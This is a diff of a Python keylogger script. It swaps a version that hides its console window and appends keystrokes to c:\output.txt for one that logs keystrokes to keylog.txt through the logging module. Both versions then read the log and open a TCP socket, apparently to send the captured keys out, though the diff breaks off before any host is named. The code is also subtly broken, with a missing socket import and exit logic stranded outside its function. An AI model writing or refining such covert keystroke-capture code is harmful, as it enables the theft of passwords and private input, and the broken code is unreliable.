@@ -1,41 +1,21 @@
-import win32api
-import win32console
-import win32gui
-import pythoncom,pyHook
-import socket
+import sys, pyHook, pythoncom, logging
 
- 
-win=win32console.GetConsoleWindow()
-win32gui.ShowWindow(win,0)
- 
+file_log = "keylog.txt"
+
 def OnKeyboardEvent(event):
-if event.Ascii==5:
-_exit(1)
-if event.Ascii !=0 or 8:
-#open output.txt to read current keystrokes
-thefile=open('c:\output.txt','r+')
-buffer=thefile.read()
-thefile.close()
-#open output.txt to write current + new keystrokes
-thefile=open('c:\output.txt','w')
-keylogs=chr(event.Ascii)
-if event.Ascii==13:
-keylogs='/n'
-buffer+=keylogs
-thefile.write(buffer)
-thefile.close()
-# create a hook manager object
-hm=pyHook.HookManager()
-hm.KeyDown=OnKeyboardEvent
-# set the hook
-hm.HookKeyboard()
-# wait forever
+    logging .basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
+    chr(event.Ascii)
+    logging.log(10,chr(event.Ascii))
+    return True
+
+hooks_manager = pyHook.HookManager ()
+hooks_manager.KeyDown = OnKeyboardEvent
+hooks_manager.HookKeyboard()
 pythoncom.PumpMessages()
+if event.Ascii == 5:
+    sys.exit()
 
-#=============================================
-#sending txt file
-
-f = open('keylogtest.txt', 'r')
+f = open('keylog.txt', 'r')
 strf = str(f.read())
 print(strf)
 eggs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
